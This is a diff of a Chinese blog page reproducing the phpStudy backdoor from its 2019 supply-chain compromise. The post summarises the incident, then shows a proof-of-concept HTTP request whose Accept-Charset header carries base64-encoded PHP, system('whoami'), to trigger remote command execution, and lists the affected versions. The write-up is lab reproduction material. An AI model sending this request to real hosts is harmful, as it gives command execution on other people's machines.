@@ -19,7 +19,7 @@
 <meta property="og:description" content="前言phpstudy是我的第一个环境，也是从大一就开始用到现在的环境，没想到李里面竟然隐藏了三年的木马。免杀三年，细思极恐啊。不过辛亏也只是自己实验用的环境，不是搭的公网的环境。  PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置">
 <meta property="og:locale" content="cn">
 <meta property="og:image" content="http://klforever.cn/images/2/1.png">
-<meta property="og:updated_time" content="2019-10-09T00:43:42.233Z">
+<meta property="og:updated_time" content="2021-04-25T09:04:37.465Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpstudy远程代码执行复现">
 <meta name="twitter:description" content="前言phpstudy是我的第一个环境，也是从大一就开始用到现在的环境，没想到李里面竟然隐藏了三年的木马。免杀三年，细思极恐啊。不过辛亏也只是自己实验用的环境，不是搭的公网的环境。  PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置">
@@ -46,14 +46,15 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+ 	  <script src="/lib/clickLove.js"></script>
   
   
 
 
   
 
-</head>
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 <body>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
@@ -220,7 +221,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">656字</span>
+      <span class="post-count">657字</span>
     </span>
   </span>
 
@@ -245,24 +246,26 @@
 <p>PhpStudy软件对于国内众多开发者而言，并不陌生。它是一款免费的PHP调试环境的程序集成包，集成了最新的Apache、PHP、MySQL、phpMyAdmin、ZendOptimizer多款软件一次性安装，无需配置即可直接使用，具有PHP环境调试和PHP开发功能。因为免费公益、简易方便，现已发展到一定的规模，有着近百万PHP语言学习者、开发者用户。<br>然而，如此绿色无公害的“国民”开发软件遭到了黑客的毒手，并且犯罪动机竟然出自黑客的技痒和虚荣心。据杭州公安披露，黑客组织早在2016年就编写了“后门”文件，并非法侵入了PhpStudy的官网，篡改了软件安装包植入“后门”。而该“后门”具有控制计算机的功能，可以远程控制下载运行脚本实现用户个人信息收集。<br>从2016年起，黑客利用该“后门”犯罪作恶一发不可收拾，大量中招的电脑沦为“肉鸡”执行危险命令，不计其数的用户账号密码、电脑数据、敏感信息被远程抓取和回传。据统计，黑客已控制了超过67万台电脑，非法获取账号密码类、聊天数据类、设备码类等数据10万余组，而此案也是2019年以来，国内影响最为严重的供应链攻击事件。</p>
 </blockquote>
 <h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>紧接着老大发来了POC，所以赶紧复现一波。</p>
-<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code>GET /110.php HTTP/1.1
-Host: 192.168.199.186
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.9
-Accept-Encoding:gzip,deflate
-Accept-Charset:c3lzdGVtKCd3aG9hbWknKTs=
-Cookie:UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
-Connection: close</code></pre><p><code>c3lzdGVtKCd3aG9hbWknKTs=这是你要执行的命令的base64加密，且请求报文除GET和Host外不能变动</code></p>
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre class="line-numbers language-java"><code class="language-java">GET <span class="token operator">/</span><span class="token number">110</span><span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token operator">:</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">199.186</span>
+Cache<span class="token operator">-</span>Control<span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token operator">:</span> <span class="token number">1</span>
+User<span class="token operator">-</span>Agent<span class="token operator">:</span> Mozilla<span class="token operator">/</span><span class="token number">5</span><span class="token punctuation">.</span><span class="token function">0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537</span><span class="token punctuation">.</span><span class="token function">36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">63.0</span><span class="token punctuation">.</span><span class="token number">3239.132</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
+Accept<span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>
+Accept<span class="token operator">-</span>Language<span class="token operator">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
+Accept<span class="token operator">-</span>Encoding<span class="token operator">:</span>gzip<span class="token punctuation">,</span>deflate
+Accept<span class="token operator">-</span>Charset<span class="token operator">:</span>c3lzdGVtKCd3aG9hbWknKTs<span class="token operator">=</span>
+Cookie<span class="token operator">:</span>UM_distinctid<span class="token operator">=</span>16ae380e49f27e<span class="token operator">-</span>0987ab403bca49<span class="token operator">-</span>3c604504<span class="token operator">-</span>1fa400<span class="token operator">-</span>16ae380e4a011b<span class="token punctuation">;</span> CNZZDATA3801251<span class="token operator">=</span>cnzz_eid<span class="token operator">%</span>3D1063495559<span class="token operator">-</span><span class="token number">1558595034</span><span class="token operator">-</span><span class="token operator">%</span>26ntime<span class="token operator">%</span>3D1559102092<span class="token punctuation">;</span> CNZZDATA1670348<span class="token operator">=</span>cnzz_eid<span class="token operator">%</span>3D213162126<span class="token operator">-</span><span class="token number">1559207282</span><span class="token operator">-</span><span class="token operator">%</span>26ntime<span class="token operator">%</span>3D1559207282
+Connection<span class="token operator">:</span> close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>c3lzdGVtKCd3aG9hbWknKTs=这是你要执行的命令的base64加密，且请求报文除GET和Host外不能变动</code></p>
 <p>在访问正常已存在的php文件时抓包将POC中的数据替换到burp中发送即可</p>
 <p><img src="/images/2/1.png" alt><br>可以看到可以远程命令执行</p>
 <h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>目前影响的版本为2016，2018中的</p>
-<pre><code>php-5.1.17 + Apache
-php-5.4.45 + Apache
-php-5.2.17 + Nginx
-</code></pre>
+<pre class="line-numbers language-java"><code class="language-java">php<span class="token operator">-</span><span class="token number">5.1</span><span class="token punctuation">.</span><span class="token number">17</span> <span class="token operator">+</span> Apache
+php<span class="token operator">-</span><span class="token number">5.4</span><span class="token punctuation">.</span><span class="token number">45</span> <span class="token operator">+</span> Apache
+php<span class="token operator">-</span><span class="token number">5.2</span><span class="token punctuation">.</span><span class="token number">17</span> <span class="token operator">+</span> Nginx
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
     
 
     
